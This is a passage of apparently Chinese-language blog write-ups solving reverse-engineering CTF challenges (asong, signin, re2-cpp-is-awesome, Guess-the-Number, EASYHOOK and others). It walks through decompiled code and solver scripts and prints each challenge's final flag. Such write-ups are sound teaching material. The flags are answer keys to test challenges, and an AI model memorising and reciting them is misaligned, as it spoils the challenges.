0;&#125;</code></pre><p>发现用到了简单的子进程和pipe。</p><p>pipe的作用就和名字一样，建立一个管道，这个管道一端是读，一端是写，按照规定，<code>pipe[0]</code>是读，<code>pipe[1]</code>是写，然后fork了一个子进程，在子进程中，返回值为0，进入if分支通过管道写入了一个字符串，然后退出子进程。在父进程中，返回的是fork出来的子进程的id，跳过if分支，在下面读取了刚刚子进程写入的字符串，关键就是lol这个函数</p><pre><code class="c++">int __cdecl lol(_BYTE *a1)&#123;  char v2; // [esp+15h] [ebp-13h]  char v3; // [esp+16h] [ebp-12h]  char v4; // [esp+17h] [ebp-11h]  char v5; // [esp+18h] [ebp-10h]  char v6; // [esp+19h] [ebp-Fh]  char v7; // [esp+1Ah] [ebp-Eh]  char v8; // [esp+1Bh] [ebp-Dh]  v2 = 2 * a1[1];  v3 = a1[4] + a1[5];  v4 = a1[8] + a1[9];  v5 = 2 * a1[12];  v6 = a1[18] + a1[17];  v7 = a1[10] + a1[21];  v8 = a1[9] + a1[25];  return printf(&quot;flag_is_not_here&quot;);&#125;</code></pre><p>这里的处理过程非常简单，还是正向的处理，但是最后输出的是一个没用的字符串，所以即使是输入子进程的pid，也不会输出真正的flag，所以还是自己动手算出来</p><pre><code class="python">a1 = &quot;69800876143568214356928753&quot;v2 = 2 * ord(a1[1])v3 = ord(a1[4]) + ord(a1[5])v4 = ord(a1[8]) + ord(a1[9])v5 = 2 * ord(a1[12])v6 = ord(a1[18]) + ord(a1[17])v7 = ord(a1[10]) + ord(a1[21])v8 = ord(a1[9]) + ord(a1[25])print(chr(v2)+chr(v3)+chr(v4)+chr(v5)+chr(v6)+chr(v7)+chr(v8))</code></pre><p>输出结果</p><pre><code>rhelheg</code></pre><p>直接提交不对，要套上外面的格式，试了一下比赛的名称，通过。</p><h4 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h4><p>这题还是很考验对于算法的逆向能力的</p><p>首先IDA打开</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  void *that_girl; // ST00_8  const char *flag; // ST08_8  that_girl = malloc(0xBCuLL);  flag = (const char *)malloc(80uLL);  sub_400BBF();  read_0((__int64)flag);  sub_400C02((__int64)flag);                   // 输入的是QCTF&#123;***&#125;的格式，在这里取出中间的部分  readfile(&quot;that_girl&quot;, (__int64)that_girl);  sub_400E54(flag, (__int64)that_girl);  return 0LL;&#125;</code></pre><p>程序流程是这样，先输入flag，然后验证格式，取中间部分，然后读取另一个文件中的内容进行一些处理，然后将输入的flag和读取出来的内容进行一个比较，输出到out里面，重点来看一下几个函数</p><pre><code class="c++">int __fastcall readfile(const char *a1, __int64 a2)&#123;  int v2; // eax  __int64 v4; // [rsp+0h] [rbp-20h]  char buf; // [rsp+13h] [rbp-Dh]  int fd; // [rsp+14h] [rbp-Ch]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  fd = open(a1, 0, a2, a1);  while ( read(fd, &amp;buf, 1uLL) == 1 )  &#123;    v2 = sub_400936(buf);    ++*(_DWORD *)(4LL * v2 + v4);  &#125;  return close(fd);&#125;</code></pre><p>这里明显看到进行了一个词频统计，但是看这个伪代码完全看不出来处理之后的v4和分配出来的a2有什么关联，这点在C伪代码里面不是很明显，但是在汇编里面可以看的很清楚</p><pre><code class="asm">call    sub_400936cdqelea     rdx, ds:0[rax*4]mov     rax, [rbp+var_20]add     rax, rdxmov     edx, [rax]add     edx, 1mov     [rax], edx</code></pre><p>这里其实很清楚，<code>sub_400936</code>就是我们用来处理的函数，它的返回值放到了<code>rax</code>，<code>cdqe</code>的拓展在这里可以不用考虑，差不多算是个类型转换，<code>ds:0</code>是之前分配的空间，把<code>ds:0[rax*4]</code>的地址复制进<code>rdx</code>，后面的一句并没有什么意义，将这个地址中的值赋给<code>rax</code>，就是0，<code>add</code>之后rax的值就是我们需要的地址，接下来把该地址内存的的值取出来，加一然后再放回去，这个操作逻辑很容易理解。</p><p>这个函数过后构建了一个词频表，然后进行关键的变换。</p><pre><code class="c++">unsigned __int64 __fastcall sub_400E54(const char *flag, __int64 that_girl)&#123;  int i; // [rsp+18h] [rbp-48h]  int v4; // [rsp+1Ch] [rbp-44h]  char v5[56]; // [rsp+20h] [rbp-40h]  unsigned __int64 v6; // [rsp+58h] [rbp-8h]  v6 = __readfsqword(0x28u);  v4 = strlen(flag);  for ( i = 0; i &lt; v4; ++i )    v5[i] = *(_DWORD *)(4LL * (signed int)sub_400936(flag[i]) + that_girl);  sub_400D33((unsigned __int8 *)v5);  sub_400DB4(v5, v4);  writefile((__int64)v5, &quot;out&quot;, v4);  return __readfsqword(0x28u) ^ v6;&#125;</code></pre><p>首先就是一个换表，然后就是两个函数的操作之后输出到了<code>out</code>文件里面，这个是我们已知的，再去看看两个关键函数</p><pre><code class="c++">__int64 __fastcall sub_400D33(unsigned __int8 *a1)&#123;  __int64 result; // rax  _BYTE v2[5]; // [rsp+13h] [rbp-5h]  v2[4] = 0;  *(_DWORD *)v2 = *a1;  while ( dword_6020A0[*(signed int *)&amp;v2[1]] )  &#123;    a1[*(signed int *)&amp;v2[1]] = a1[dword_6020A0[*(signed int *)&amp;v2[1]]];    *(_DWORD *)&amp;v2[1] = dword_6020A0[*(signed int *)&amp;v2[1]];  &#125;  result = v2[0];  a1[*(signed int *)&amp;v2[1]] = v2[0];  return result;&#125;</code></pre><p>这是一个简单的次序上的调整，可以很快的逆出来</p><pre><code class="c++">_BYTE *__fastcall sub_400DB4(_BYTE *a1, int a2)&#123;  _BYTE *result; // rax  char v3; // [rsp+17h] [rbp-5h]  int i; // [rsp+18h] [rbp-4h]  v3 = *a1 &gt;&gt; 5;  for ( i = 0; a2 - 1 &gt; i; ++i )    a1[i] = 8 * a1[i] | (a1[i + 1] &gt;&gt; 5);  result = &amp;a1[i];  *result = 8 * *result | v3;  return result;&#125;</code></pre><p>这个函数里有些很有意思的操作，这个或操作看着很熟悉，这是显然是一个换位的操作，但是这里用了前一个数和后一个数之间的交错换位，逆起来就有了一些难度。</p><p>我也看过一些其他大佬的wp，这里普遍都是采用了爆破的方法，我不是很喜欢，虽然爆破可能更加省时省力，我还是想更加加深一下逆向位运算的熟练程度。</p><p>经过观察我们可以很轻松的发现，只需要将所有的数拆成两部分，再按照反方向运算回去就可以了，非常简单。</p><p>这样的话所有的内容就分析完了，这里我用python来做的逆向（后悔没有用C++）</p><pre><code class="python">def sub_400936(a1):    result = a1 - 10    if a1 == 10:        result = a1 + 35    if a1 == 32 or a1 == 33 or a1 == 34:        result = a1 + 10    if a1 == 39:        result = a1 + 2    if a1 == 44:        result = a1 - 4    if a1 == 46:        result = a1 - 7    if a1 == 58 or a1 == 59:        result = a1 - 21    if a1 == 63:        result = a1 - 27    if a1 == 95:        result = a1 - 49    if a1 &lt;= 47 or a1 &gt; 48:        if a1 &lt;= 64 or a1 &gt; 90:            if 96 &lt; a1 &lt;= 122:                result = a1 - 87        else:            result = a1 - 55    else:        result = a1 - 48    return resultdef get_that_girl():    adic = &#123;&#125;    fp = open(&quot;that_girl&quot;, &quot;r&quot;)    while True:        data = fp.read(1)        if not data:            break        else:            data = sub_400936(ord(data))            if data in adic:                adic[data] = adic[data] + 1            else:                adic[data] = 1    fp.close()    return adicdef table():    t = &#123;&#125;    for ia in range(256):        t[sub_400936(ia)] = ia    return ta1 = [0xec, 0x29, 0xe3, 0x41, 0xe1, 0xf7, 0xaa, 0x1d, 0x29, 0xed, 0x29, 0x99, 0x39, 0xf3, 0xb7, 0xa9, 0xe7, 0xac, 0x2b,      0xb7, 0xab, 0x40, 0x9f, 0xa9, 0x31, 0x35, 0x2c, 0x29, 0xef, 0xA8, 0x3d, 0x4b, 0xb0, 0xe9, 0xe1, 0x68, 0x7b, 0x41]target = []part1 = []part2 = []for i in range(len(a1)):    part2.append((a1[i] &gt;&gt; 3) &amp; 0xff)    part1.append((a1[i] &lt;&lt; 5) &amp; 0xff)target.append(part2[0] | part1[len(a1) - 1])for i in range(1, len(a1)):    target.append(part2[i] | part1[i - 1])dword_6020A0 = [22, 0, 6, 2, 30, 24, 9, 1, 21, 7, 18, 10, 8, 12, 17, 23, 13, 4, 3, 14, 19, 11, 20, 16, 15, 5, 25, 36,                27, 28, 29, 37, 31, 32, 33, 26, 34, 35]i = 0index = []while (dword_6020A0[i]):    index.append(i)    i = dword_6020A0[i]index.append(1)index.reverse()a2 = [0 for i in range(len(index))]for i in index:    if i == 1:        a2[0] = target[i]    a2[i] = target[dword_6020A0.index(i)]dic = get_that_girl()dic_ = &#123;v: k for k, v in dic.items()&#125;flag = &#39;QCTF&#123;&#39;for i in a2:    flag += chr(table()[dic_[i]])flag += &#39;&#125;&#39;print(flag)</code></pre><p>最后一部分最开始是打算爆破，但是想到了一种更简便的方法，就是先把所有的ASCII码值遍历一遍，制作一个表，可以避免双重循环爆破，虽然实际上爆破也并不麻烦。</p><p>最后输出flag</p><pre><code>QCTF&#123;that_girl_saying_no_for_your_vindicate&#125;</code></pre><h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>找一道比较简单的题目保持一下做题的感觉</p><p>用Ghidra打开，部分函数的签名有问题，有时候将RDX误当作函数的参数，但是函数只需要两个参数，这里我打开IDA看了一下，IDA做的要比Ghidra好很多，根据汇编修改了一下函数签名，看一下主要的函数部分。</p><pre><code class="c++">undefined8 FUN_00100a21(void)&#123;  int iVar1;  long in_FS_OFFSET;  undefined local_4a8 [16];  undefined local_498 [16];  undefined local_488 [16];  undefined local_478 [16];  undefined local_468 [112];  undefined local_3f8 [1000];  long local_10;    local_10 = *(long *)(in_FS_OFFSET + 0x28);  puts(&quot;[sign in]&quot;);  printf(&quot;[input your flag]: &quot;);  __isoc99_scanf(&amp;DAT_00100c26,local_468);                    /* 字符串转16进制 */  FUN_0010096a(local_468,local_3f8);  __gmpz_init_set_str(local_478,&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;,                      0x10);  __gmpz_init_set_str(local_488,local_3f8,0x10);  __gmpz_init_set_str(local_4a8,                                                                  &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;                      ,10);  __gmpz_init_set_str(local_498,&quot;65537&quot;,10);  __gmpz_powm(local_488,local_488,local_498,local_4a8);  iVar1 = __gmpz_cmp(local_488,local_478);  if (iVar1 == 0) &#123;    puts(&quot;TTTTTTTTTTql!&quot;);  &#125;  else &#123;    puts(&quot;GG!&quot;);  &#125;  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) &#123;                    /* WARNING: Subroutine does not return */    __stack_chk_fail();  &#125;  return 0;&#125;</code></pre><p>首先是需要我们输入字符串，然后进行了一些大数的操作，这里是利用了一个库，查了一下mannual，很好理解，输入之后有一个函数对我们输入的字符串进行了一些操作，进入这个函数</p><pre><code class="c++">void FUN_0010096a(char *param_1,long param_2)&#123;  size_t sVar1;  int local_20;  int local_1c;    local_20 = 0;  local_1c = 0;  while( true ) &#123;    sVar1 = strlen(param_1);    if (sVar1 &lt;= (ulong)(long)local_20) break;    *(undefined *)(local_1c + param_2) = (&amp;DAT_00302010)[(int)(param_1[local_20] &gt;&gt; 4)];    *(undefined *)((long)local_1c + 1 + param_2) =         (&amp;DAT_00302010)[(int)((int)param_1[local_20] &amp; 0xf)];    local_20 = local_20 + 1;    local_1c = local_1c + 2;  &#125;  return;&#125;</code></pre><p>看到分别取低四位和高四位的操作之后立刻反应过来是把字符串转换为16进制串，耐心看一下很好理解。</p><p>回到主函数，看到乘幂取模操作，发现是RSA，用yafu分解一下<code>103461035900816914121390101299049044413950405173712170434161686539878160984549</code></p><p>分解的也很快，这个数还是不够大</p><pre><code>prp39 = 282164587459512124844245113950593348271prp39 = 366669102002966856876605669837014229419</code></pre><p>然后可以直接在线解密也是可以解出来的，由于gmpy2安装不上，直接在线解密了</p><pre><code>suctf&#123;Pwn_@_hundred_years&#125;</code></pre><h4 id="key"><a href="#key" class="headerlink" title="key"></a>key</h4><p>过程很复杂，动态调试绕过文件检测之后调试出flag</p><pre><code>idg_cni~bjbfi|gsxb</code></pre><h4 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h4><p>题目还是很不错，逻辑很清楚，仔细观察可以看出来杨辉三角就解决了，一共20层，全部组合起来取md5就可以了</p><pre><code class="python">import hashlibdef create(line):  # 生成杨辉三角的一行    L = [1]    for x in range(1, len(line)):        L.append(line[x] + line[x - 1])    L.append(1)    return LL = [1]raw_flag = &#39;1&#39;for x in range(19):    L = create(L)    raw_flag += &#39;&#39;.join([str(i) for i in L])# print(raw_flag)m = hashlib.md5(raw_flag.encode()).hexdigest()print(&#39;RCTF&#123;&#39; + m + &#39;&#125;&#39;)</code></pre><p>输出flag</p><pre><code>RCTF&#123;37894beff1c632010dd6d524aa9604db&#125;</code></pre><h4 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h4><p>没想到会用pwntools去爆破一道逆向题……</p><p>感觉有些复杂，无脑爆破得到结果</p><h4 id="catch-me"><a href="#catch-me" class="headerlink" title="catch-me"></a>catch-me</h4><p>这题用了<code>sse</code>算法，而且整个过程非常复杂，所以猜测了一下其中的两个数相同，然后得到了flag</p><h4 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h4><p>首先脱壳，然后观察IDA，发现函数很多进行了很多次的异或运算，因此选择直接动态调试，调试到关键函数的最后发现几个运算是算出了flag的三个部分，拼接得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（三）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>题目还不是很难，所以还是放在一起来写</p><span id="more"></span><h4 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h4><p>这题并不知道是在干什么，IDA打开是个dumpfile，打开给了很多16进制，看到了<code>0x68</code>这个经典数字（<code>push</code>指令的编码)，后面接了两个字符，看到<code>fl</code>，感觉有问题，找到后面很多个<code>0x68</code>，每个后买你都跟了两个字符，像是把flag<code>push</code>进栈的操作，所以把这些数据导出，然后写个脚本跑一下，验证猜想</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    unsigned char ida_chars[] =            &#123;                    0x68, 0x66, 0x6C, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48,                    0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F,                    0x05, 0x68, 0x61, 0x67, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24,                    0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x0F, 0x05, 0x68, 0x7B, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34,                    0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05, 0x68, 0x6F, 0x70, 0x00, 0x00, 0x48, 0xBF,                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,                    0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x6F, 0x00, 0x00, 0x48,                    0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x72, 0x00, 0x00,                    0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x65, 0x74, 0x00,                    0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7D, 0x0A,                    0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31,                    0xFF, 0x48, 0xB8, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05            &#125;;    int len = sizeof(ida_chars)/ sizeof(ida_chars[0]);    string flag;    int i =0;    while(i!=len) &#123;        if(ida_chars[i]==0x68)        &#123;            while(ida_chars[++i]!=0x00)            &#123;                flag+=ida_chars[i];            &#125;        &#125;        else        &#123;            i++;        &#125;    &#125;    cout&lt;&lt;flag&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出flag</p><pre><code>flag&#123;poppopret&#125;</code></pre><p>提交的时候只需要中间的部分</p><h4 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h4><p>这题有很多string类，所以还是要慢慢分析</p><pre><code class="c++">__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  char *v3; // rbx  __int64 v4; // rax  __int64 v5; // rdx  __int64 v6; // rax  __int64 v7; // rdx  __int64 v8; // rdx  __int64 v9; // rdx  __int64 i; // [rsp+10h] [rbp-60h]  char v12; // [rsp+20h] [rbp-50h]  char v13; // [rsp+4Fh] [rbp-21h]  __int64 v14; // [rsp+50h] [rbp-20h]  int v15; // [rsp+5Ch] [rbp-14h]  if ( a1 != 2 )  &#123;    v3 = *a2;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Usage: &quot;, a3);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; flag\n&quot;, v7);    exit(0);  &#125;  std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13);  std::allocator&lt;char&gt;::~allocator(&amp;v13);  v15 = 0;  for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; sub_400D7A(&amp;i) )  &#123;    v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12);    if ( !sub_400D3D((__int64)&amp;i, (__int64)&amp;v14) )      break;    v9 = *(unsigned __int8 *)sub_400D9A((__int64)&amp;i);    if ( (_BYTE)v9 != off_6020A0[dword_6020C0[v15]] )      sub_400B56((__int64)&amp;i, (__int64)&amp;v14, v9);    ++v15;  &#125;  sub_400B73((__int64)&amp;i, (__int64)&amp;v14, v8);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12);  return 0LL;&#125;</code></pre><p>真正有用的内容只有一个for循环，在这之前我们输入的字符串被传入了<code>v12</code>，然后用迭代器进行循环，遍历整个字符串，每个字符被赋值给了<code>v9</code>，然后进行判断，如果判断可以通过，我们输入的就是正确的flag，判断的条件是<code>v9 = off_6020A0[dword_6020C0[v15]]</code>，一个嵌套索引，把数据导出之后很容易得到结果</p><pre><code class="python">target = &quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;dword_6020C0 = [36, 0, 5, 54, 101, 7, 39, 38, 45, 1, 3, 0, 13, 86, 1, 3, 101, 3, 45, 22, 2, 21, 3, 101, 0, 41, 68, 68,                1, 68, 43]flag = &#39;&#39;for i in dword_6020C0:    # print(i)    flag += target[i]print(flag)</code></pre><p>输出结果</p><pre><code>ALEXCTF&#123;W3_L0v3_C_W1th_CL45535&#125;</code></pre><h4 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h4><p>这题是MFC，题目中的函数很多，打开发现输入有错误提示，还是从字符串入手，找到了几个很有用的函数</p><pre><code class="c++">BOOL __cdecl sub_4017F0(int a1)&#123;  BOOL result; // eax  char Str1[28]; // [esp+D8h] [ebp-24h]  int v3; // [esp+F4h] [ebp-8h]  int v4; // [esp+F8h] [ebp-4h]  v4 = 0;  v3 = 0;  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )  &#123;    Str1[v4] = alphabet[*(_DWORD *)(a1 + 4 * v4)];    ++v4;  &#125;  Str1[v4] = 0;  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )    result = pass();  else    result = fail();  return result;&#125;</code></pre><p>更改了一些函数和变量名，更容易辨认，这个函数传入了<code>a1</code>之后，对<code>a1</code>之后的地址上的内容作为索引值依次连接组成了一个新的字符串，所以<code>a1</code>显然应该是一个地址，或者说是一个数组的首地址，而这个数组的内容我们很容易就可以得到，接着再看到底在哪里引用了这个函数</p><pre><code class="c++">int __thiscall sub_401890(CWnd *this)&#123;  struct CString *v1; // ST08_4  CWnd *v2; // eax  int v3; // eax  int v5[26]; // [esp+4Ch] [ebp-74h]  int i; // [esp+B4h] [ebp-Ch]  char *Str; // [esp+B8h] [ebp-8h]  CWnd *v8; // [esp+BCh] [ebp-4h]  v8 = this;  v1 = (CWnd *)((char *)this + 100);  v2 = CWnd::GetDlgItem(this, 1002);  CWnd::GetWindowTextA(v2, v1);  v3 = sub_401A30((char *)v8 + 100);  Str = CString::GetBuffer((CWnd *)((char *)v8 + 100), v3);  if ( !strlen(Str) )    return CWnd::MessageBoxA(v8, &amp;Qingshuru, 0, 0);  for ( i = 0; Str[i]; ++i )  &#123;    if ( Str[i] &gt; 57 || Str[i] &lt; 48 )    &#123;      if ( Str[i] &gt; 122 || Str[i] &lt; 97 )      &#123;        if ( Str[i] &gt; 90 || Str[i] &lt; 65 )          fail();        else          v5[i] = Str[i] - 29;      &#125;      else      &#123;        v5[i] = Str[i] - 87;      &#125;    &#125;    else    &#123;      v5[i] = Str[i] - 48;    &#125;  &#125;  return sub_4017F0((int)v5);&#125;</code></pre><p>这个函数也很简单，把输入的内容赋给<code>Str</code>，然后对str里面的字符进行一个变换，把变换后的数组传给刚刚分析的那个函数，所以想要逆向解出输入的字符就很简单了</p><pre><code class="python">str1 = &#39;KanXueCTF2019JustForhappy&#39;alphabet = &#39;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&#39;a1 = []for i in str1:    j = alphabet.index(i)    a1.append(j)# print(a1)flag = &#39;&#39;for i in a1:    if 0 &lt;= i &lt;= 9:        flag += chr(i + 48)    elif i &lt;= 35:        flag += chr(i + 87)    else:        flag += chr(i + 29)print(flag)</code></pre><p>根据题目要求把输出的内容套上flag</p><pre><code>flag&#123;j0rXI4bTeustBiIGHeCF70DDM&#125;</code></pre><h4 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h4><p>毫无意义的题目，打开就能看到flag，套上<code>flag&#123;&#125;</code>直接交上去就行了</p><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>题如其名，peid打开发现是c#，所以直接dnspy打开，发现flag是直接计算出来的，并且没有进行任何的反调试，所以直接调试运行几步就得到了flag</p><pre><code>flag&#123;967DDDFBCD32C1F53527C221D9E40A0B&#125;</code></pre><h4 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h4><p>这题是java逆向，cfr反编译之后，查看源代码</p><pre><code class="java">import java.io.PrintStream;import java.math.BigInteger;public class guess &#123;    static String XOR(String _str_one, String _str_two) &#123;        BigInteger i1 = new BigInteger(_str_one, 16);        BigInteger i2 = new BigInteger(_str_two, 16);        BigInteger res = i1.xor(i2);        String result = res.toString(16);        return result;    &#125;    public static void main(String[] args) &#123;        block5: &#123;            int guess_number = 0;            int my_num = 349763335;            int my_number = 1545686892;            int flag = 345736730;            if (args.length &gt; 0) &#123;                try &#123;                    guess_number = Integer.parseInt(args[0]);                    if (my_number / 5 == guess_number) &#123;                        String str_one = &quot;4b64ca12ace755516c178f72d05d7061&quot;;                        String str_two = &quot;ecd44646cfe5994ebeb35bf922e25dba&quot;;                        my_num += flag;                        String answer = guess.XOR(str_one, str_two);                        System.out.println(&quot;your flag is: &quot; + answer);                        break block5;                    &#125;                    System.err.println(&quot;wrong guess!&quot;);                    System.exit(1);                &#125;                catch (NumberFormatException e) &#123;                    System.err.println(&quot;please enter an integer \nexample: java -jar guess 12&quot;);                    System.exit(1);                &#125;            &#125; else &#123;                System.err.println(&quot;wrong guess!&quot;);                int num = 1000000;                ++num;                System.exit(1);            &#125;        &#125;    &#125;&#125;</code></pre><p>程序很简单，我们当然可以根据算法来算出来flag的值，但是完全可以得到需要输入的数，所以直接运行就好了</p><pre><code class="powershell">&gt;java -jar Guess-the-Number.jar 309137378</code></pre><p>输出结果</p><pre><code>your flag is: a7b08c546302cc1fd2a4d48bf2bf2ddb</code></pre><p>直接提交即可</p><h4 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h4><p>这题很有意思，值得好好分析一下，IDA打开，找到main函数</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int result; // eax  HANDLE v4; // eax  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h]  char Buffer; // [esp+8h] [ebp-20h]  puts((int)aPleaseInputFla);  scanf(a31s, &amp;Buffer);  if ( strlen(&amp;Buffer) == 19 )  &#123;    sub_401220();    v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);    WriteFile(v4, &amp;Buffer, 19u, &amp;NumberOfBytesWritten, 0);    sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten);    if ( NumberOfBytesWritten == 1 )      puts((int)aRightFlagIsYou);    else      puts((int)aWrong);    system(aPause);    result = 0;  &#125;  else  &#123;    puts((int)aWrong);    system(aPause);    result = 0;  &#125;  return result;&#125;</code></pre><p>第一反应当然是查看一下<code>sub_401240()</code>的内容，毕竟这是最后一个调用<code>NumberOfBytesWritten</code>的函数，而这个值，经过<code>writeFile()</code>之后应该是19</p><pre><code class="c++">signed int __cdecl sub_401240(const char *a1, _DWORD *a2)&#123;  signed int result; // eax  unsigned int v3; // kr04_4  char v4[24]; // [esp+Ch] [ebp-18h]  result = 0;  strcpy(v4, &quot;This_is_not_the_flag&quot;);  v3 = strlen(a1) + 1;  if ( (signed int)(v3 - 1) &gt; 0 )  &#123;    while ( v4[a1 - v4 + result] == v4[result] )    &#123;      if ( ++result &gt;= (signed int)(v3 - 1) )      &#123;        if ( result == 21 )        &#123;          result = (signed int)a2;          *a2 = 1;        &#125;        return result;      &#125;    &#125;  &#125;  return result;&#125;</code></pre><p>看到<code>This_is_not_the_flag</code>感觉有些不对，仔细观察发现这个字符串有20的字符，而下面的判断需要我们的输入和这个字符串相等，但是我们只输入19个字符，所以这个函数永远不可能返回我们想要的结果，肯定是有什么东西被漏掉了，所以返回<code>main</code>，前面还有一个<code>sub_401220()</code>没有看</p><pre><code class="c++">int sub_401220()&#123;  HMODULE v0; // eax  DWORD v2; // eax  v2 = GetCurrentProcessId();  hProcess = OpenProcess(0x1F0FFFu, 0, v2);  v0 = LoadLibraryA(LibFileName);  dword_40C9C4 = 